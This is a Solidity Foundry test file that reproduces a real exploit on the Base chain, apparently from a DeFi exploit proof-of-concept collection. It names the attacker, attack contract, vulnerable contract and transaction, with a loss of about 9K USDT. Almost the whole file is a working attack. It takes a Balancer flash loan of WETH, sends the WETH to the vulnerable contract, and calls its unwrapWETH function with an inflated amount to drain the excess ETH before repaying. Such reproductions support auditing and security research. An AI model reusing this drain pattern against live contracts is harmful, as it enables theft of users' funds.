//  SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;


import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~9 K usdt
// Original Attacker : https://basescan.org/address/0x5cc162c556092fe1d993b95d1b9e9ce58a11dbc9
// Attack Contract : https://basescan.org/address/0x0c6a8c285d696d4d9b8dd4079a72a6460a4da05f
// Vulnerable Contract: https://basescan.org/address/0x8befc1d90d03011a7d0b35b3a00ec50f8e014802
// Attack Tx : https://app.blocksec.com/explorer/tx/base/0xac6f716c57bbb1a4c1e92f0a9531019ea2ecfcaea67794bbd27115d400ae9b41
//author: test

contract Unwarp is Test {
    IWETH private constant WETH = IWETH(payable(0x4200000000000000000000000000000000000006));
    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address A=0x8bEfC1d90d03011a7d0b35B3a00eC50f8E014802;

            

    function setUp() public {
        vm.createSelectFork("base", 30210273);
    }

    function testExploit() public {
        IERC20(WETH).approve(address(vault), type(uint256).max);
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100852657473363426325;
        bytes memory encodedata = abi.encode(address(this));

        vault.flashLoan(address(this),assets,amounts,encodedata);
         
        emit log_named_decimal_uint("WETH Balance after the attack",address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.transfer(address(A),100852657473363426325);
        address(A).call(abi.encodeWithSignature("unwrapWETH(uint256,address)",104833984375000000000 ,address(this)));
        WETH.deposit{value: 100852657473363426325}();
        WETH.transfer(address(vault),100852657473363426325);
    }

    fallback() external payable {}

}

